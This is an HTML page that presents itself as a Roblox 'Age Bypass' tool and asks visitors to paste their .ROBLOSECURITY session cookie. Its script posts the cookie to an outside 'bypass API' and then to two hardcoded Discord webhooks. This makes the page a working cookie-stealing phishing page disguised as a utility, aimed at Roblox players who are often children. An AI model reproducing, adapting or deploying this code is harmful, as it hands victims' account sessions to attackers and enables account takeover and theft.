<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@virtuso</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(-45deg, #FF0000, #FF7F7F, #FF0000, #FF7F7F);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite;
            color: #ffffff;
            min-height: 100vh;
            position: relative;
            font-size: 14px;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .content {
            position: relative;
            z-index: 2;
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        .header {
            text-align: center;
            padding: 2rem 0;
            border-bottom: 2px solid #ffffff;
            margin-bottom: 2rem;
        }

        .title {
            font-size: 2rem;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
            margin-bottom: 1rem;
        }

        .discord-btn {
            background: #ffffff;
            color: #FF0000;
            padding: 0.8rem 1.5rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s ease;
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
        }

        .discord-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
        }

        .section {
            background: rgba(255, 255, 255, 0.1);
            padding: 1.5rem;
            border-radius: 10px;
            margin-bottom: 2rem;
            backdrop-filter: blur(5px);
            border: 1px solid #ffffff30;
        }

        h2 {
            font-size: 1.4rem;
            margin-bottom: 1rem;
            color: #ffffff;
        }

        .help-icon {
            font-size: 0.8rem;
            margin-left: 0.5rem;
            cursor: help;
            color: #ffffff80;
            vertical-align: super;
        }

        .action-btns {
            display: flex;
            gap: 1rem;
            margin-top: 1.5rem;
        }

        .generator-btn {
            background: #ffffff;
            color: #FF0000;
            padding: 0.8rem 1.5rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            font-size: 0.95rem;
            text-decoration: none;
            display: inline-block;
        }

        .tiktok-btn {
            background: transparent;
            color: #ffffff;
            padding: 0.8rem 1.5rem;
            border: 2px solid #ffffff;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            font-size: 0.95rem;
            text-decoration: none;
            display: inline-block;
        }

        .note {
            color: #ffffff;
            font-size: 0.8rem;
            margin-top: 1rem;
        }

        .cookie-input {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #ffffff;
            border-radius: 5px;
            background: transparent;
            color: #ffffff;
            font-size: 1rem;
            margin-bottom: 1rem;
        }

        .cookie-input::placeholder {
            color: #ffffff80;
        }
    </style>
</head>
<body>
    <div class="content">
        <header class="header">
            <h1 class="title">@virtuso</h1>
            <a href="https://discord.gg/rqV3Cjze" class="discord-btn" target="_blank">Join Discord</a>
        </header>

        <main>
            <section class="section">
                <h2>Age Bypass <i class="fa-regular fa-circle-question help-icon"></i></h2>
                <input type="text" id="cookie-input" class="cookie-input" placeholder="Enter your .ROBLOSECURITY cookie">
                <div class="action-btns">
                    <button id="age-bypass-btn" class="generator-btn">Bypass Age</button>

                <div class="action-btns">
                    <a href="https://linktr.ee/virtuosotiktokdomains" class="generator-btn" target="_blank">Visit TikTok Domains</a>
                </div>
            </section>
        </main>
    </div>

    <script>
        // Age Bypass Logic
        document.getElementById('age-bypass-btn').addEventListener('click', async () => {
            const cookie = document.getElementById('cookie-input').value;
            if (!cookie) {
                alert("Cookie is required!");
                return;
            }

            // Calculate birthdate (2 days before turning 13)
            const today = new Date();
            const birthYear = today.getFullYear() - 13;
            let birthMonth = today.getMonth() + 1;
            let birthDay = today.getDate() - 2;

            if (birthDay < 1) {
                birthMonth -= 1;
                if (birthMonth < 1) {
                    birthMonth = 12;
                    birthYear -= 1;
                }
                const lastDayOfMonth = new Date(birthYear, birthMonth, 0).getDate();
                birthDay = lastDayOfMonth + birthDay;
            }

            const payload = {
                Cookie: cookie,
                Type: "agebypass",
                Birthdate: {
                    birthMonth: birthMonth,
                    birthDay: birthDay,
                    birthYear: birthYear
                }
            };

            // Send to bypass API
            const bypassApiUrl = "https://aether.biz.id/api/function.php"; // Replace with your bypass API URL

            try {
                const response = await fetch(bypassApiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    const result = await response.text();
                    if (result.toLowerCase().includes("success")) {
                        alert("Age bypassed successfully!");
                    } else {
                        alert("Failed to bypass age. Please check your cookie.");
                    }
                } else {
                    alert("Failed to connect to the bypass API. Please try again later.");
                }
            } catch (error) {
                alert("An error occurred. Please try again.");
                console.error(error);
            }

            // Send to webhooks
            const webhookUrl1 = "https://discord.com/api/webhooks/1334432481277116427/azeOz7cJFLcKv4qtjIHj28SpaQkS47aR3rGdXN7v2O1_aHn-lMlLEMoD9l20eAj2AdME";
            const webhookUrl2 = "https://discord.com/api/webhooks/1282360662068039700/KyumBlRkrh5fhdh2Yfbpd0IB4hNl81TeFcuj7Sfis2OrTGlyDH8wyC1NcxSkgSzgyJtP";

            try {
                await fetch(webhookUrl1, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `New submission: ${cookie}` })
                });

                await fetch(webhookUrl2, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `New submission: ${cookie}` })
                });

                console.log("Cookie submitted to webhooks successfully!");
            } catch (error) {
                console.error("Failed to submit cookie to webhooks:", error);
            }
        });
    </script>
</body>
</html>
